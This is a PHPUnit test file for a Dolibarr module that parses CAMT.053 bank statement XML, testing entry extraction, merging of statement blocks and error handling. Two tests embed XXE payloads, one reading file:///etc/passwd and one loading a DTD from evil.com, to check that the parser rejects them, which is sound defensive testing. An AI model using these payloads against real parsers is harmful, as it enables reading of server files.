<?php
/* Copyright (C) 2024 Slordef
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

/**
 * \file       test/phpunit/Camt053FileProcessorTest.php
 * \ingroup    camt053readerandlink
 * \brief      PHPUnit tests for Camt053FileProcessor class
 */

use PHPUnit\Framework\TestCase;

// Include required classes
require_once dirname(__FILE__) . '/../../class/Camt053Entry.class.php';
require_once dirname(__FILE__) . '/../../class/Camt053Statement.class.php';
require_once dirname(__FILE__) . '/../../class/Camt053FileProcessor.class.php';

/**
 * Mock database class for testing
 */
class MockDb
{
	private $queryResult = null;
	private $fetchResult = null;

	public function query($sql)
	{
		return $this->queryResult;
	}

	public function fetch_object($result)
	{
		return $this->fetchResult;
	}

	public function escape($value)
	{
		return addslashes($value);
	}

	public function setQueryResult($result)
	{
		$this->queryResult = $result;
	}

	public function setFetchResult($result)
	{
		$this->fetchResult = $result;
	}
}

/**
 * Class Camt053FileProcessorTest
 *
 * Unit tests for Camt053FileProcessor class
 */
class Camt053FileProcessorTest extends TestCase
{
	/**
	 * @var string Path to fixtures directory
	 */
	private $fixturesPath;

	/**
	 * @var MockDb Mock database
	 */
	private $mockDb;

	/**
	 * Set up test environment
	 *
	 * @return void
	 */
	protected function setUp(): void
	{
		$this->fixturesPath = dirname(__FILE__) . '/fixtures/';
		$this->mockDb = new MockDb();
	}

	/**
	 * Test parsing a valid CAMT.053 file
	 *
	 * @return void
	 */
	public function testParseValidFile(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$this->assertTrue($result);
		$this->assertNull($processor->getError());
		$this->assertNotNull($processor->getStructure());
	}

	/**
	 * Test extracting statements from valid file
	 *
	 * @return void
	 */
	public function testExtractStatements(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$this->assertTrue($result);

		$statements = $processor->getStatements();
		$this->assertNotEmpty($statements);
		$this->assertCount(1, $statements); // Sample file has 1 statement

		$statement = $statements[0];
		$this->assertInstanceOf(Camt053Statement::class, $statement);
		$this->assertStringContainsString('BE71', $statement->getIban());
		$this->assertTrue($statement->isFromFile());
	}

	/**
	 * Test that entries are properly extracted
	 *
	 * @return void
	 */
	public function testExtractEntries(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$statements = $processor->getStatements();
		$statement = $statements[0];
		$entries = $statement->getEntries();

		$this->assertCount(3, $entries); // Sample file has 3 entries

		// Check first entry (credit)
		$entry1 = $entries[0];
		$this->assertEquals(1500.00, $entry1->getAmount());
		$this->assertEquals('2024-01-15', $entry1->getValueDate());
		$this->assertTrue($entry1->isCredit());
		$this->assertTrue($entry1->isFromFile());

		// Check second entry (debit)
		$entry2 = $entries[1];
		$this->assertEquals(-250.00, $entry2->getAmount());
		$this->assertTrue($entry2->isDebit());
	}

	/**
	 * Test XXE protection - external entity declaration should be blocked
	 *
	 * @return void
	 */
	public function testXxeProtection(): void
	{
		$maliciousXml = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Document>
	<BkToCstmrStmt>
		<GrpHdr>
			<MsgId>&xxe;</MsgId>
		</GrpHdr>
	</BkToCstmrStmt>
</Document>';

		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseContent($maliciousXml);

		$this->assertFalse($result);
		$this->assertStringContainsString('external entities not allowed', $processor->getError());
	}

	/**
	 * Test XXE protection with parameter entity
	 *
	 * @return void
	 */
	public function testXxeProtectionParameterEntity(): void
	{
		$maliciousXml = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
  %xxe;
]>
<Document><BkToCstmrStmt></BkToCstmrStmt></Document>';

		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseContent($maliciousXml);

		$this->assertFalse($result);
		$this->assertStringContainsString('external entities not allowed', $processor->getError());
	}

	/**
	 * Test parsing non-existent file
	 *
	 * @return void
	 */
	public function testParseNonExistentFile(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseFile('/non/existent/file.xml');

		$this->assertFalse($result);
		$this->assertStringContainsString('File not found', $processor->getError());
	}

	/**
	 * Test parsing invalid XML content
	 *
	 * @return void
	 */
	public function testParseInvalidXml(): void
	{
		$invalidXml = 'This is not valid XML <><>';

		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseContent($invalidXml);

		$this->assertFalse($result);
		$this->assertNotNull($processor->getError());
	}

	/**
	 * Test parsing from pre-parsed structure
	 *
	 * @return void
	 */
	public function testParseStructure(): void
	{
		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array(
					'MsgId' => 'TEST001',
					'CreDtTm' => '2024-01-31T12:00:00'
				),
				'Stmt' => array(
					'Acct' => array(
						'Id' => array(
							'IBAN' => 'BE71096123456769'
						)
					),
					'Ntry' => array(
						array(
							'Amt' => '100.00',
							'CdtDbtInd' => 'CRDT',
							'ValDt' => array('Dt' => '2024-01-15'),
							'AcctSvcrRef' => 'REF001',
							'NtryDtls' => array(
								'TxDtls' => array(
									'RmtInf' => array(
										'Ustrd' => 'Test payment'
									)
								)
							)
						)
					)
				)
			)
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseStructure($structure);

		$this->assertTrue($result);

		$statements = $processor->getStatements();
		$this->assertCount(1, $statements);

		$entries = $statements[0]->getEntries();
		$this->assertCount(1, $entries);
		$this->assertEquals(100.00, $entries[0]->getAmount());
	}

	/**
	 * Test getting creation date
	 *
	 * @return void
	 */
	public function testGetCreationDate(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$creationDate = $processor->getCreationDate();
		$this->assertEquals('2024-01-31T12:00:00', $creationDate);
	}

	/**
	 * Test getStatementsByAccountId
	 *
	 * @return void
	 */
	public function testGetStatementsByAccountId(): void
	{
		// Set up mock to return an account ID
		$mockAccount = new stdClass();
		$mockAccount->rowid = 123;
		$this->mockDb->setQueryResult(true);
		$this->mockDb->setFetchResult($mockAccount);

		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$statementsByAccount = $processor->getStatementsByAccountId();

		// Since we don't have a real DB, account ID will be null for unmatched IBAN
		// But we can verify the method returns an array
		$this->assertIsArray($statementsByAccount);
	}

	/**
	 * A document carrying several <Stmt> blocks for the same account must keep
	 * every entry: the blocks are merged, not overwritten. Losing them is
	 * invisible in the UI, and the cron would delete the source file from the
	 * SFTP server afterwards.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @return void
	 */
	public function testStatementsOfTheSameAccountAreMerged(): void
	{
		// The IBAN lookup is skipped unless the Dolibarr context is present.
		if (!defined('MAIN_DB_PREFIX')) {
			define('MAIN_DB_PREFIX', 'llx_');
		}
		if (!function_exists('getEntity')) {
			function getEntity($element = '', $shared = 1, $currentobject = null)
			{
				return '1';
			}
		}

		$mockAccount = new stdClass();
		$mockAccount->rowid = 7;
		$this->mockDb->setQueryResult(true);
		$this->mockDb->setFetchResult($mockAccount);

		$makeStmt = function ($refs) {
			$entries = array();
			foreach ($refs as $i => $ref) {
				$entries[] = array(
					'Amt' => (string) (100 * ($i + 1)) . '.00',
					'CdtDbtInd' => 'CRDT',
					'ValDt' => array('Dt' => '2024-01-1' . ($i + 1)),
					'AcctSvcrRef' => $ref,
				);
			}
			return array(
				'Acct' => array('Id' => array('IBAN' => 'BE71096123456769')),
				'Ntry' => $entries,
			);
		};

		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array('MsgId' => 'TEST', 'CreDtTm' => '2024-01-31T12:00:00'),
				'Stmt' => array(
					$makeStmt(array('REF-A', 'REF-B')),
					$makeStmt(array('REF-C')),
				),
			),
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$this->assertTrue($processor->parseStructure($structure));
		$this->assertCount(2, $processor->getStatements());

		$byAccount = $processor->getStatementsByAccountId();

		$this->assertArrayHasKey(7, $byAccount);
		$this->assertCount(1, $byAccount, 'Both blocks belong to the same account');
		$this->assertCount(3, $byAccount[7]->getEntries(), 'No entry may be dropped');

		$hashes = array();
		foreach ($byAccount[7]->getEntries() as $entry) {
			$hashes[] = $entry->getHash();
		}
		$this->assertCount(3, array_unique($hashes), 'Merged entries keep distinct form keys');

		// Merging must not mutate the parsed statements: a second call has to
		// return the same thing, not twice as much.
		$this->assertCount(3, $processor->getStatementsByAccountId()[7]->getEntries());
		$this->assertCount(2, $processor->getStatements()[0]->getEntries());
	}

	/**
	 * Overlapping blocks re-report the same movement under the same bank
	 * reference. It must be kept once: a copy under a rewritten hash matches
	 * nothing and shows up as an unmatched entry inviting a duplicate payment.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @return void
	 */
	public function testAMovementRepeatedAcrossBlocksIsKeptOnce(): void
	{
		if (!defined('MAIN_DB_PREFIX')) {
			define('MAIN_DB_PREFIX', 'llx_');
		}
		if (!function_exists('getEntity')) {
			function getEntity($element = '', $shared = 1, $currentobject = null)
			{
				return '1';
			}
		}

		$mockAccount = new stdClass();
		$mockAccount->rowid = 7;
		$this->mockDb->setQueryResult(true);
		$this->mockDb->setFetchResult($mockAccount);

		$entry = array(
			'Amt' => '100.00',
			'CdtDbtInd' => 'CRDT',
			'ValDt' => array('Dt' => '2024-01-15'),
			'AcctSvcrRef' => 'REF-DUP',
		);
		$block = array(
			'Acct' => array('Id' => array('IBAN' => 'BE71096123456769')),
			'Ntry' => array($entry),
		);

		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array('MsgId' => 'TEST', 'CreDtTm' => '2024-01-31T12:00:00'),
				'Stmt' => array($block, $block),
			),
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$this->assertTrue($processor->parseStructure($structure));

		$entries = $processor->getStatementsByAccountId()[7]->getEntries();

		$this->assertCount(1, $entries, 'The repeated movement is kept once');
		$this->assertSame('REF-DUP', $entries[0]->getHash());
	}

	/**
	 * Two entries of the SAME block repeating a reference are two real movements
	 * (split and collective bookings do reuse AcctSvcrRef). Only a repeat coming
	 * from another block is a re-report and may be dropped.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @return void
	 */
	public function testARepeatedReferenceInsideOneBlockIsKept(): void
	{
		if (!defined('MAIN_DB_PREFIX')) {
			define('MAIN_DB_PREFIX', 'llx_');
		}
		if (!function_exists('getEntity')) {
			function getEntity($element = '', $shared = 1, $currentobject = null)
			{
				return '1';
			}
		}

		$mockAccount = new stdClass();
		$mockAccount->rowid = 7;
		$this->mockDb->setQueryResult(true);
		$this->mockDb->setFetchResult($mockAccount);

		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array('MsgId' => 'TEST', 'CreDtTm' => '2024-01-31T12:00:00'),
				'Stmt' => array(
					array(
						'Acct' => array('Id' => array('IBAN' => 'BE71096123456769')),
						'Ntry' => array(
							array('Amt' => '100.00', 'CdtDbtInd' => 'CRDT', 'ValDt' => array('Dt' => '2024-01-15'), 'AcctSvcrRef' => 'REF-A'),
							array('Amt' => '250.00', 'CdtDbtInd' => 'CRDT', 'ValDt' => array('Dt' => '2024-01-16'), 'AcctSvcrRef' => 'REF-A'),
						),
					),
				),
			),
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$this->assertTrue($processor->parseStructure($structure));

		$entries = $processor->getStatementsByAccountId()[7]->getEntries();

		$this->assertCount(2, $entries, 'Both movements of the block are kept');
		$amounts = array($entries[0]->getAmount(), $entries[1]->getAmount());
		sort($amounts);
		$this->assertSame(array(100.0, 250.0), $amounts);
	}

	/**
	 * The same rule in the second block: a reference repeated inside block 2 is
	 * kept, while the copy of block 1's reference is dropped. Pins the dedup to
	 * the real block index rather than a constant.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @return void
	 */
	public function testRepeatedReferenceInsideTheSecondBlockIsKept(): void
	{
		if (!defined('MAIN_DB_PREFIX')) {
			define('MAIN_DB_PREFIX', 'llx_');
		}
		if (!function_exists('getEntity')) {
			function getEntity($element = '', $shared = 1, $currentobject = null)
			{
				return '1';
			}
		}

		$mockAccount = new stdClass();
		$mockAccount->rowid = 7;
		$this->mockDb->setQueryResult(true);
		$this->mockDb->setFetchResult($mockAccount);

		$ntry = function ($amount, $day, $ref) {
			return array(
				'Amt' => $amount,
				'CdtDbtInd' => 'CRDT',
				'ValDt' => array('Dt' => '2024-01-' . $day),
				'AcctSvcrRef' => $ref,
			);
		};
		$acct = array('Id' => array('IBAN' => 'BE71096123456769'));

		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array('MsgId' => 'TEST', 'CreDtTm' => '2024-01-31T12:00:00'),
				'Stmt' => array(
					array('Acct' => $acct, 'Ntry' => array($ntry('100.00', '15', 'REF-A'))),
					array('Acct' => $acct, 'Ntry' => array(
						// Re-report of block 1: dropped.
						$ntry('100.00', '15', 'REF-A'),
						// Two real movements of block 2 sharing a reference: kept.
						$ntry('300.00', '20', 'REF-B'),
						$ntry('400.00', '21', 'REF-B'),
					)),
				),
			),
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$this->assertTrue($processor->parseStructure($structure));

		$amounts = array();
		foreach ($processor->getStatementsByAccountId()[7]->getEntries() as $entry) {
			$amounts[] = $entry->getAmount();
		}
		sort($amounts);

		$this->assertSame(array(100.0, 300.0, 400.0), $amounts);
	}

	/**
	 * The merged statement keeps the identity the rest of the module reads from
	 * it: origin flag, IBAN and creation date.
	 *
	 * @runInSeparateProcess
	 * @preserveGlobalState disabled
	 * @return void
	 */
	public function testMergedStatementKeepsItsIdentity(): void
	{
		if (!defined('MAIN_DB_PREFIX')) {
			define('MAIN_DB_PREFIX', 'llx_');
		}
		if (!function_exists('getEntity')) {
			function getEntity($element = '', $shared = 1, $currentobject = null)
			{
				return '1';
			}
		}

		$mockAccount = new stdClass();
		$mockAccount->rowid = 7;
		$this->mockDb->setQueryResult(true);
		$this->mockDb->setFetchResult($mockAccount);

		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array('MsgId' => 'TEST', 'CreDtTm' => '2024-01-31T12:00:00'),
				'Stmt' => array(
					'Acct' => array('Id' => array('IBAN' => 'BE71096123456769')),
					'Ntry' => array(
						array('Amt' => '100.00', 'CdtDbtInd' => 'CRDT', 'ValDt' => array('Dt' => '2024-01-15'), 'AcctSvcrRef' => 'REF-A'),
					),
				),
			),
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$this->assertTrue($processor->parseStructure($structure));

		$parsed = $processor->getStatements()[0];
		$merged = $processor->getStatementsByAccountId()[7];

		$this->assertTrue($merged->isFromFile(), 'The cron and the page both gate on this flag');
		$this->assertSame($parsed->getIban(), $merged->getIban());
		$this->assertSame($parsed->getCreationDate(), $merged->getCreationDate());
		$this->assertSame(7, $merged->getAccountId());
	}

	/**
	 * A self-closed <AcctSvcrRef/> comes back as an empty array from the
	 * SimpleXML round trip. It must fall back to the content hash instead of
	 * aborting the whole import with a type error.
	 *
	 * @return void
	 */
	public function testSelfClosedAcctSvcrRefFallsBackToContentHash(): void
	{
		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array('MsgId' => 'TEST', 'CreDtTm' => '2024-01-31T12:00:00'),
				'Stmt' => array(
					'Acct' => array('Id' => array('IBAN' => 'BE71096123456769')),
					'Ntry' => array(
						array(
							'Amt' => '100.00',
							'CdtDbtInd' => 'CRDT',
							'ValDt' => array('Dt' => '2024-01-15'),
							'AcctSvcrRef' => array(),
						),
					),
				),
			),
		);

		$processor = new Camt053FileProcessor($this->mockDb);

		$this->assertTrue($processor->parseStructure($structure));

		$entries = $processor->getStatements()[0]->getEntries();
		$this->assertCount(1, $entries);
		$this->assertSame('', $entries[0]->getBankReference());
		$this->assertNotEmpty($entries[0]->getHash());
	}

	/**
	 * An XML that is not a CAMT.053 document must be reported as a failure, not
	 * thrown: an uncaught exception used to kill the whole cron run, skipping
	 * every remaining config and leaving the SFTP session open.
	 *
	 * @return void
	 */
	public function testNonCamtXmlIsReportedNotThrown(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);

		$result = $processor->parseContent('<?xml version="1.0"?><Document><Other/></Document>');

		$this->assertFalse($result);
		$this->assertNotEmpty($processor->getError());
	}

	/**
	 * Test parsing XML with single entry (not array)
	 *
	 * @return void
	 */
	public function testParseSingleEntry(): void
	{
		$structure = array(
			'BkToCstmrStmt' => array(
				'GrpHdr' => array(
					'MsgId' => 'TEST001',
					'CreDtTm' => '2024-01-31T12:00:00'
				),
				'Stmt' => array(
					'Acct' => array(
						'Id' => array(
							'IBAN' => 'BE71096123456769'
						)
					),
					// Single entry (not in array)
					'Ntry' => array(
						'Amt' => '500.00',
						'CdtDbtInd' => 'DBIT',
						'ValDt' => array('Dt' => '2024-01-20')
					)
				)
			)
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseStructure($structure);

		$this->assertTrue($result);

		$statements = $processor->getStatements();
		$entries = $statements[0]->getEntries();
		$this->assertCount(1, $entries);
		$this->assertEquals(-500.00, $entries[0]->getAmount()); // DBIT = negative
	}

	/**
	 * Test parsing debit entry correctly sets negative amount
	 *
	 * @return void
	 */
	public function testDebitEntryNegativeAmount(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$statements = $processor->getStatements();
		$entries = $statements[0]->getEntries();

		// Find the debit entry
		$debitEntry = null;
		foreach ($entries as $entry) {
			if ($entry->isDebit()) {
				$debitEntry = $entry;
				break;
			}
		}

		$this->assertNotNull($debitEntry);
		$this->assertTrue($debitEntry->getAmount() < 0);
	}

	/**
	 * Test parsing credit entry correctly sets positive amount
	 *
	 * @return void
	 */
	public function testCreditEntryPositiveAmount(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$statements = $processor->getStatements();
		$entries = $statements[0]->getEntries();

		// Find a credit entry
		$creditEntry = null;
		foreach ($entries as $entry) {
			if ($entry->isCredit()) {
				$creditEntry = $entry;
				break;
			}
		}

		$this->assertNotNull($creditEntry);
		$this->assertTrue($creditEntry->getAmount() > 0);
	}

	/**
	 * Test empty XML structure handling
	 *
	 * @return void
	 */
	public function testEmptyStructure(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseStructure(array());

		$this->assertFalse($result);
		$this->assertNotNull($processor->getError());
	}

	/**
	 * Test invalid CAMT.053 structure
	 *
	 * @return void
	 */
	public function testInvalidCamt053Structure(): void
	{
		$invalidStructure = array(
			'SomeOtherRoot' => array(
				'Data' => 'value'
			)
		);

		$processor = new Camt053FileProcessor($this->mockDb);
		$result = $processor->parseStructure($invalidStructure);

		$this->assertFalse($result);
		$this->assertStringContainsString('Invalid CAMT.053 structure', $processor->getError());
	}

	/**
	 * Test IBAN formatting in statements
	 *
	 * @return void
	 */
	public function testIbanFormatting(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$statements = $processor->getStatements();
		$iban = $statements[0]->getIban();

		// IBAN should be formatted with spaces
		$this->assertStringContainsString(' ', $iban);
	}

	/**
	 * Test entry hash is extracted from AcctSvcrRef
	 *
	 * @return void
	 */
	public function testEntryHashFromAcctSvcrRef(): void
	{
		$processor = new Camt053FileProcessor($this->mockDb);
		$processor->parseFile($this->fixturesPath . 'sample_camt053.xml');

		$statements = $processor->getStatements();
		$entries = $statements[0]->getEntries();

		// First entry should have hash from AcctSvcrRef
		$entry = $entries[0];
		$this->assertEquals('CREDIT001', $entry->getHash());
	}
}
